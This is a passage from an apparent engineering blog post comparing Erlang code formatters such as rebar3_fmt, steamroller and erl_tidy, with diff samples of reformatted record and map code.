code-styles. It should be easy for newcomers to maintain the coding
style. It should also be easy to read diffs, and the discussions about
code style and formatting will be minimized because there is a
concensus.</p><h1>This is nice, I want it for Erlang</h1><p>As some of our services are written in Erlang, I wanted to investigate
which formatters exist for Erlang, and what state they are in. I used
our last hack day for this purpose.</p><p>The requirements I had was that it should be reproducable. Calling the
formatter multiple times should not change the structure more than
once (first time of being called). The formatter should also
preferably work with rebar3 (the most used Erlang build tool).  The
tool should not use external tooling that wouldn't work for all
developers flow.</p><p>I also wanted it to have a short execution time, at least after the
initial formatting.</p><h1>Benchmark</h1><p>I searched for formatting tools on hex.pm, github.com, duckduckgo.com,
google.com and came up with the following arbitrary list of Erlang
formatters. There is probably others, but these seems to be the most
used.</p><ul><li>rebar3_fmt</li><li>steamroller</li><li>otp/erl_tidy</li><li>tsloughter/erl_tidy</li><li>rebar3_format</li><li>eryngii</li></ul><h2 class="anchor anchorWithStickyNavbar_LWe7" id="rebar3_fmt"><a href="https://github.com/fenollp/erlang-formatter" target="_blank" rel="noopener noreferrer">rebar3_fmt</a><a class="hash-link" href="#rebar3_fmt" title="Direct link to heading">​</a></h2><p>One big problem with this is that it uses Emacs <code>erlang-mode</code> for
formatting. Sure, I am an Emacs user and the <code>erlang-mode</code> and its
formatting is maintained and supperted by OTP, but my non-Emacs
coworkers would not be happy if they need to install Emacs every time
they want to format the code.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="steamroller"><a href="https://github.com/old-reliable/steamroller/" target="_blank" rel="noopener noreferrer">steamroller</a><a class="hash-link" href="#steamroller" title="Direct link to heading">​</a></h2><p>Though it was easy to setup (just add it to dependencies in your Rebar
config and run <code>rebar3 steamroll</code>), my first impression of the
execution was that it was really slow. Even when running subsequent
calls on my Dell XPS 13 P82G it took around 3.5 minutes to format.</p><p>The plugin had some support for increasing the number of workers from
the default <code>--J=1</code>, but that did not seem to help with the execution
time.</p><p>The default steamroller formatting options specify 2 spaces instead of
the <code>erlang-mode</code> 4 spaces standard that is used in our code base.</p><p>Here is a sample of a complex record structure</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                   components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                       [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                         #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                            parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                                   'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">   components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     [</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">       {</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           invokeID = 1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">           parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">               'vlr-Number' = CallingGTBCD</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">       }</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     ]</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"> },</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I was quite happy with the results, even though they were slow, until
I saw how it treated maps</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">      parameters =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">          #{called_party_addr =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                ... },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            calling_party_addr =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                ... },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            data =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                #'Continue'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">         parameters =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">             #{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 called_party_addr</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                   ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 calling_party_addr</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #sccp_addr{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                   ...</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 },</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 data</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 =&gt;</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                 #'Continue'{</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>I can't say that I easily understand what the parameters are and which
the values are with this formatting. It burns in my eyes.</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="erl_tidy-and-erl_tidy"><a href="https://github.com/tsloughter/erl_tidy" target="_blank" rel="noopener noreferrer">erl_tidy</a> and <a href="https://erlang.org/documentation/doc-11.2/lib/syntax_tools-2.5/doc/html/erl_tidy.html" target="_blank" rel="noopener noreferrer">erl_tidy</a><a class="hash-link" href="#erl_tidy-and-erl_tidy" title="Direct link to heading">​</a></h2><p>So I found two <code>erl_tidy</code> projects, one is included in the Erlang/OTP
libraries. The other one seems just to be a rebar3 wrapper around the
first one, so I'll just talk about the former one.</p><p>Under the hood this library uses <code>erl_prettypr:format/2</code>, which prints
the abstract syntax tree. This should work well, but gives weird
indentation problems.  For instance when it comes to records it will
not add a newline before the first field, so the lines will become
quite long, and when the lines become close to the paper width of the
document then it inserts too many newlines.</p><p>Visualising with this example again</p><div class="language-diff codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#bfc7d5;--prism-background-color:#292d3e"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-diff codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">        components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">            [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">              #'Invoke'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 invokeID = 1,linkedID = asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 operationCode = updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                 parameter =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                     #'UpdateLocationArg'{</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        imsi = IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        'msc-Number' = CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token deleted-sign deleted prefix deleted" style="color:rgb(255, 85, 114)">-</span><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)">                        'vlr-Number' = CallingGTBCD}}}]},</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token deleted-sign deleted line" style="color:rgb(255, 85, 114)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">     components =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">    [{invoke,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">      #'Invoke'{invokeID</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            1,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            linkedID</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            asn1_NOVALUE,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            operationCode</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            updateLocation,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            parameter</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">            #'UpdateLocationArg'{imsi</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         IMSI,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         'msc-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         CallingGTBCD,</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         'vlr-Number'</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         =</span><br></span><span class="token-line" style="color:#bfc7d5"><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)"></span><span class="token inserted-sign inserted prefix inserted" style="color:rgb(195, 232, 141)">+</span><span class="token inserted-sign inserted line" style="color:rgb(195, 232, 141)">                         CallingGTBCD}}}]},</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg class="copyButtonIcon_y97N" viewBox="0 0 24 24"><path d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg class="copyButtonSuccessIcon_LjdS" viewBox="0 0 24 24"><path d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>There are also some issues with <code>erl_prettypr</code>; it throws an exception
